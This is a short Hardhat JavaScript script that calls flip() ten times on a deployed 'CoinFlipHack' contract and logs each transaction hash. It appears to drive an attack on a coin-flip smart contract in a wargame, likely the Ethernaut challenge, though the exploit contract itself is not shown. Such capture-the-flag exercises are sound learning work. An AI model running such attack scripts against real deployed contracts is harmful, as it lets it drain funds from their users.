const hre = require("hardhat");
const abi = require("../artifacts/contracts/CoinFlipHack.sol/CoinFlipHack.json");

// Script calls the flip method 10 times from our hack, which is calling it from CoinFlip.
async function main() {

    const [deployer] = await hre.ethers.getSigners();
    console.log("Attacking using MetaMask account:", deployer.address); 

    const contractAddress = "0xDA21F57c6BBBd6F3b248b6E7092542Def4C04E3e"
    const contractABI = abi.abi;
    const coinFlipHack = new hre.ethers.Contract(contractAddress, contractABI, deployer);

    for(let i = 0; i < 10; i++) {
        try {
            const result = await coinFlipHack.flip();
            await result.wait();
            console.log('Flip', i + 1, 'transaction hash:', result.hash);
        } catch (error) {
            console.error('Flip failed:', error.message);
        }
    }
};

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });